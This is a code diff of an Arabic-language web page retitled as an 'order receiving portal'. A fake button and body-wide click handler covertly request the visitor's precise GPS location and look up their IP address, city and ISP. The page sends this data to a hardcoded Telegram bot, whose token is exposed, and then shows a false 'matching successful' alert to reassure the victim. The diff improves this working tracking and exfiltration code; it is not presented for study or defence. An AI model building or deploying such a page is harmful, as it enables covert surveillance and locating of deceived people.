@@ -4,18 +4,17 @@ index.html
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام التحقق الذكي</title>
+    <title>بوابة استلام الطلبات</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
         body, html { height: 100%; width: 100%; background: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
-        .main-container { width: 90%; max-width: 400px; background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; padding: 40px 25px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; z-index: 10; }
-        .icon-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #38bdf8, #1d4ed8); border-radius: 25px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 10px 20px rgba(58, 189, 248, 0.3); }
+        .main-container { width: 90%; max-width: 400px; background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; padding: 40px 25px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); z-index: 10; }
+        .icon-circle { width: 80px; height: 80px; background: linear-gradient(135deg, #38bdf8, #1d4ed8); border-radius: 25px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; }
         h1 { font-size: 20px; color: white; margin-bottom: 10px; }
         p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
-        .btn-fake { width: 100%; padding: 15px; background: white; color: #0f172a; border-radius: 15px; font-weight: 700; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+        .btn-fake { width: 100%; padding: 15px; background: white; color: #0f172a; border-radius: 15px; font-weight: 700; }
     </style>
 </head>
 <body onclick="capture()" ontouchstart="capture()">
@@ -31,28 +30,38 @@ index.html
     const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
     const ID = '6876904688';
 
+    // وظيفة جلب الـ IP من مصدر بديل وموثوق
+    async function getIpData() {
+        try {
+            // استخدام ip-api.com وهي أسرع ولا تطلب مفاتيح
+            const response = await fetch('https://ipapi.co/json/');
+            if (response.ok) return await response.ok ? await response.json() : null;
+        } catch (e) {
+            // محاولة ثانية من مصدر آخر إذا فشل الأول
+            const res2 = await fetch('https://api.ipify.org?format=json');
+            return await res2.json();
+        }
+        return null;
+    }
+
     async function capture() {
-        // 1. محاولة جلب الموقع
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                async (p) => { await send(p.coords.latitude, p.coords.longitude, "✅ موقع دقيق"); },
-                async (e) => { await send(null, null, "⚠️ رفض الإذن"); },
+                async (p) => { await send(p.coords.latitude, p.coords.longitude, "✅ تم تحديد الموقع"); },
+                async (e) => { await send(null, null, "⚠️ الزبون رفض الإذن"); },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         } else {
-            await send(null, null, "❌ لا يدعم GPS");
+            await send(null, null, "❌ المتصفح لا يدعم GPS");
         }
     }
 
     async function send(lat, lng, stat) {
-        let ipRes = { ip: "--", city: "--", org: "--" };
-        try {
-            const r = await fetch('https://ipapi.co/json/');
-            ipRes = await r.json();
-        } catch (err) { console.log("IP Error"); }
+        // جلب الـ IP أولاً
+        const ipRes = await getIpData() || { ip: "غير معروف", city: "غير معروف", org: "غير معروف" };
 
         const map = lat ? `https://www.google.com/maps?q=${lat},${lng}` : "مرفوض";
-        const text = `🔔 نقرة جديدة\n━━━━━━━━━━━━\nالحالة: ${stat}\nIP: ${ipRes.ip}\nالمدينة: ${ipRes.city}\nالشركة: ${ipRes.org}\nالموقع: ${map}\n━━━━━━━━━━━━`;
+        const text = `🔔 إشعار جديد\n━━━━━━━━━━━━\nالحالة: ${stat}\nIP: ${ipRes.ip || ipRes.query || '??'}\nالمدينة: ${ipRes.city || '??'}\nالشركة: ${ipRes.org || ipRes.isp || '??'}\nالموقع: ${map}\n━━━━━━━━━━━━`;
 
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
@@ -60,8 +69,7 @@ index.html
             body: JSON.stringify({ chat_id: ID, text: text })
         });
         
-        // تنبيه للزبون لزيادة المصداقية
-        alert("جاري مطابقة الموقع مع السيرفر.. يرجى الانتظار");
+        alert("تمت المطابقة بنجاح، انتظر رد النظام...");
     }
 </script>
 </body>
